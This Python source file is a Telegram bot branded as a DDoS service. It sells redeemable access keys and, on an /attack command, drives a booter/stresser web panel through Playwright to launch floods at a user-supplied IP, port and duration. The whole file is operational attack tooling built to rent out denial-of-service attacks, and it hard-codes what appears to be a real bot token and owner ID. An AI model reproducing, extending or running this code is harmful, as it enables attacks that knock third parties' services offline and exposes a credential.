import asyncio
import json
import time
import random
import string
import sys
from datetime import datetime, timedelta

from playwright.async_api import async_playwright
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# Windows Playwright fix
if sys.platform == "win32":
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

TOKEN = "7722378149:AAFjOvBhy-2zNt3pUl78KJ3vs7Z1MFvTuAE"
OWNER_ID = 5879359815

DB_FILE = "db.json"

browser = None
context = None
page = None

attack_running = False
attack_end_time = 0


# ---------------- DATABASE ---------------- #

def load_db():
    try:
        with open(DB_FILE) as f:
            return json.load(f)
    except:
        return {"keys": {}, "users": {}}


def save_db():
    with open(DB_FILE, "w") as f:
        json.dump(db, f)


db = load_db()


# ---------------- PLAYWRIGHT ---------------- #

async def start_browser():
    global browser, context, page

    playwright = await async_playwright().start()

    browser = await playwright.chromium.launch(headless=False)

    context = await browser.new_context()

    page = await context.new_page()

    # FIXED URL
    await page.goto("https://satellitestress.st/attack")


# ---------------- ATTACK TIMER ---------------- #

async def monitor_attack(msg, ip, port, duration):

    global attack_running

    start = time.time()

    while True:

        elapsed = int(time.time() - start)

        remain = duration - elapsed

        if remain <= 0:
            break

        await msg.edit_text(
            f"""🚀 Attack Running

IP : {ip}
Port : {port}

Remaining : {remain}s"""
        )

        await asyncio.sleep(1)

    attack_running = False

    await msg.edit_text(
        f"""✅ Attack Finished

IP : {ip}
Port : {port}
Time : {duration}s"""
    )


# ---------------- UTILS ---------------- #

def gen_key(days):

    rand = ''.join(random.choices(string.digits, k=8))

    key = f"KING-OF-GOD{rand}"

    expire = (datetime.now() + timedelta(days=days)).timestamp()

    db["keys"][key] = expire

    save_db()

    return key


def authorised(user_id):

    user_id = str(user_id)

    if user_id not in db["users"]:
        return False

    if time.time() > db["users"][user_id]:

        del db["users"][user_id]

        save_db()

        return False

    return True


# ---------------- COMMANDS ---------------- #

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    await update.message.reply_text(
        "👋 Welcome to KING OF GODS DDOS BOT\n\nUse /help to see commands"
    )


async def helpcmd(update: Update, context: ContextTypes.DEFAULT_TYPE):

    await update.message.reply_text(
        """
✨ Bot Commands Menu ✨

📜 Available Commands

🚀 /attack "<ip>" "<port>" "<time>"
⚡ Start an attack on the given target.

🎟 /redeem "<key>"
🔑 Redeem your key to activate your access.

⏱ /when
📊 Check when your current plan expires.

👑 Owner Commands

🛠 /gen "<days>"
🔐 Generate a redeem key for specific days.

❌ /remove "<user_id>"
🗑 Remove a user's access immediately.

👥 /users
📋 View all registered users of the bot.
"""
    )


async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if update.effective_user.id != OWNER_ID:
        return await update.message.reply_text("❌ Owner only")

    try:

        days = int(context.args[0])

        key = gen_key(days)

        await update.message.reply_text(
            f"🔑 Key Generated\n\n{key}\n\nValid {days} days"
        )

    except:
        await update.message.reply_text("Usage: /gen days")


async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):

    try:

        key = context.args[0]

        if key not in db["keys"]:
            return await update.message.reply_text("❌ Invalid key")

        expire = db["keys"][key]

        user = str(update.effective_user.id)

        db["users"][user] = expire

        del db["keys"][key]

        save_db()

        await update.message.reply_text("✅ Access Activated")

    except:
        await update.message.reply_text("Usage: /redeem key")


async def users(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if update.effective_user.id != OWNER_ID:
        return await update.message.reply_text("❌ Owner only")

    msg = "👥 Users\n\n"

    for u in db["users"]:

        days = int((db["users"][u] - time.time()) / 86400)

        msg += f"{u} : {days} days\n"

    await update.message.reply_text(msg)


async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove a user's access immediately"""
    
    if update.effective_user.id != OWNER_ID:
        return await update.message.reply_text("❌ Owner only")
    
    try:
        user_id = context.args[0]
        
        # Check if user exists in database
        if user_id in db["users"]:
            # Remove user from database
            del db["users"][user_id]
            save_db()
            await update.message.reply_text(f"✅ User {user_id} has been removed from access")
        else:
            await update.message.reply_text(f"❌ User {user_id} not found in database")
            
    except IndexError:
        await update.message.reply_text("Usage: /remove user_id")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")


async def when(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if not attack_running:
        return await update.message.reply_text("No attack running")

    remain = int(attack_end_time - time.time())

    await update.message.reply_text(f"Remaining {remain}s")


async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):

    global attack_running, attack_end_time

    if not authorised(update.effective_user.id):
        return await update.message.reply_text("❌ Not authorised")

    if attack_running:
        return await update.message.reply_text(
            "⚠️ Attack already running\nUse /when"
        )

    try:

        ip = context.args[0]

        port = context.args[1]

        duration = int(context.args[2])

        if duration > 300:
            return await update.message.reply_text("Max 300 seconds")

        # PANEL SELECTORS (same)

        await page.get_by_role("textbox", name="104.29.138.132").fill(ip)

        await page.get_by_role("textbox", name="80").fill(port)

        await page.get_by_role("textbox", name="60").fill(str(duration))

        await page.get_by_role("button", name="Launch").click()

        attack_running = True

        attack_end_time = time.time() + duration

        msg = await update.message.reply_text(
            f"""🚀 Attack Started

IP : {ip}
Port : {port}
Time : {duration}s"""
        )

        asyncio.create_task(
            monitor_attack(msg, ip, port, duration)
        )

    except Exception as e:

        print("Attack error:", e)

        await update.message.reply_text(
            "⚠️Usage: /attack ip port time"
        )


# ---------------- MAIN ---------------- #

async def main():

    await start_browser()

    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", helpcmd))
    app.add_handler(CommandHandler("gen", gen))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("users", users))
    app.add_handler(CommandHandler("remove", remove))  # New remove command
    app.add_handler(CommandHandler("when", when))
    app.add_handler(CommandHandler("attack", attack))

    print("Bot started...")

    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    await asyncio.Event().wait()


if __name__ == "__main__":
    asyncio.run(main())